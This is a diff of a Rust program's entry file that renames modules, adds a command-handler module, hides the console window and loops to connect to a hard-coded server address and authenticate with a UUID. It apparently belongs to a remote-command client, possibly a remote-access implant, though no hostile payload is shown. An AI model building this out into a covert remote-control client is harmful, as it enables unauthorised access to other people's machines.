@@ -4,22 +4,26 @@
     windows_subsystem = "windows"
 )]
 
+use commands::handler;
 use std::error::Error;
 use tokio::io::AsyncWriteExt;
 use tokio::net::TcpStream;
 
-mod packet;
+mod types;
+use types::Codes::AuthUuid;
+use types::Packet;
+
 mod utils;
 
-use packet::message_code::MessageCode::AuthUuid;
-use packet::Packet;
+mod commands;
+
 static SERVER_ADDR: &str = "10.0.0.12:7660";
 static CONNECTION_RETRY_DELAY: u64 = 5;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
-    let uuid = utils::initialisation().await;
-    // Connect to a peer
+    let uuid = utils::initialisation().await; // Use the `utils` module
+                                              // Connect to a peer
     let mut stream = loop {
         match TcpStream::connect(SERVER_ADDR).await {
             Ok(stream) => break stream,
